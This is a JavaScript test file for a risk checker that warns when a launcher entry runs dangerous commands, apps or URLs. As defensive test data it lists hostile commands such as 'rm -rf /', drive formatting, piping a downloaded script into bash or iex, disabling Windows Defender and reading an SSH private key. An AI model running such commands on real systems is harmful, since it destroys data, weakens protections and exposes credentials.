"use strict";
const test = require("node:test");
const assert = require("node:assert");
const { warningsOf } = require("../lib/risk");

const cmd = (command) => ({ kind: "command", launch: { command } });

test("normal commands and apps have no warnings", () => {
  for (const c of ["npm run dev", "code .", "python manage.py runserver", "git pull && npm start", "start chrome https://example.com"]) {
    assert.deepEqual(warningsOf(cmd(c)), [], c);
  }
  assert.deepEqual(warningsOf({ kind: "app", launch: { exe: String.raw`C:\Program Files\App\app.exe`, args: [] } }), []);
  assert.deepEqual(warningsOf({ kind: "website", launch: { url: "https://github.com" } }), []);
  assert.deepEqual(warningsOf({ kind: "website", launch: { url: "http://127.0.0.1:3000" } }), []);
});

test("harmful commands are flagged with a reason", () => {
  const cases = {
    "rm -rf /": "Deletes files recursively",
    [String.raw`del /s /q C:\Users\me\*`]: "Deletes files in bulk",
    [String.raw`Remove-Item C:\Users -Recurse -Force`]: "Deletes whole folders",
    "format D: /q": "Formats a drive",
    "irm https://x.example/a.ps1 | iex": "Downloads a script and runs it",
    "curl -s https://x.example/i.sh | bash": "Downloads a script and runs it",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi": "Runs a hidden (encoded) PowerShell command",
    [String.raw`reg delete HKCU\Software\X /f`]: "Changes the Windows registry",
    "schtasks /create /tn x /tr evil.exe /sc onlogon": "Creates a scheduled task",
    "Set-MpPreference -DisableRealtimeMonitoring $true": "Changes Windows Defender settings",
    [String.raw`type %USERPROFILE%\.ssh\id_rsa`]: "Reads private keys, passwords or browser cookies",
    "shutdown /s /t 0": "Shuts down or restarts the PC",
  };
  for (const [c, why] of Object.entries(cases)) assert.ok(warningsOf(cmd(c)).includes(why), c + " -> " + JSON.stringify(warningsOf(cmd(c))));
});

test("apps from temp or Downloads, script files, and odd URLs are flagged", () => {
  assert.ok(warningsOf({ kind: "app", launch: { exe: String.raw`C:\Users\me\AppData\Local\Temp\x.exe`, args: [] } }).length);
  assert.ok(warningsOf({ kind: "app", launch: { exe: String.raw`C:\Users\me\Downloads\setup.exe`, args: [] } }).length);
  assert.ok(warningsOf({ kind: "app", launch: { exe: String.raw`C:\tools\run.bat`, args: [] } }).length);
  assert.ok(warningsOf({ kind: "website", launch: { url: "http://45.12.3.9/login" } }).length);
  assert.ok(warningsOf({ kind: "website", launch: { url: "https://user:pw@example.com" } }).length);
});
